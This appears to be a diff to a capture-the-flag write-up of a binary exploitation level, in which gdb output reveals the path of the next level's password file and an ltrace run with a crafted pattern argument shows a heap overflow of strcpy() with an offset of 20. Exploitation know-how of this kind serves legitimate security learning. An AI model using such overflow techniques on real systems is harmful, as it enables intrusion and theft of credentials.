@@ -133,12 +133,46 @@ Looks like, `m()` is never called inside the `main()` function. Let's check what
   End of assembler dump.
 ```
 
-> 
+> This function loads a global variable located at `0x8049960` called `c` to print its value previously set in `main()` with `fgets()`.
 
 # Data
 
 ## Strings
 
-## Buffers size
+```gdb
+  0x080485c7 <+166>:   mov    $0x80486eb,%eax
+  
+  (gdb) x/s 0x80486eb
+  0x80486eb: "/home/user/level8/.pass"
+```
+
+The string `/home/user/level8/.pass` is stored at address `0x80486eb` and it is used as input to `fopen()`. It must be the way to get the next password.
 
 ## Buffers offset
+
+In this program we can identify two `strcpy()` calls.
+
+```gdb
+  ...
+  0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
+  ...
+  0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
+  ...
+```
+
+Since we know that programs uses `strcpy()` at some point, it is vulnerable to **buffer overflow**.
+
+```shell
+  $> ltrace ./level7  `echo -e "import string\nprint ''.join([char * 4 for char in string.ascii_letters])" | python` "teststring"
+__libc_start_main(0x8048521, 3, 0xbffff704, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                                          = 0x0804a008
+malloc(8)                                                                                          = 0x0804a018
+malloc(8)                                                                                          = 0x0804a028
+malloc(8)                                                                                          = 0x0804a038
+strcpy(0x0804a018, "aaaabbbbccccddddeeeeffffgggghhhh"...)                                          = 0x0804a018
+strcpy(0x66666666, "teststring" <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+> Using a buffer overflow we can overide the destination address of the second call. which is `ffff`, using the same method as previous level, this buffer offset is indeed **20**.
